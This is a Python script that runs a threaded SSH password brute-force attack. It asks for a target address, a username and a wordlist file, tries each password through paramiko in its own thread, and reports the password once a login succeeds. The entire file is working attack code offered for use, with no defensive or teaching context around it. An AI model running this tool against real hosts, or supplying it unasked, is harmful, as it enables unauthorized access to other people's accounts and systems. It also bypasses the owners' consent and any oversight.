import socket
import threading, time
import paramiko, sys, os, termcolor

stop_flag = 0


def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()


host = input('[+] Enter Target Address: ')
username = input('[+] SSH username: ')
input_file = input('[+] Passwords file: ')
print('Trying to connect...\n')
# check if file exists
if not os.path.exists(input_file):
    print('[!!] That file/Path does not exist')
    sys.exit(1)
print(termcolor.colored(('* * * Starting Threaded SSH bruteforce on ' + host + ' with Account: ' + username + ' * * *'), 'blue'))

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
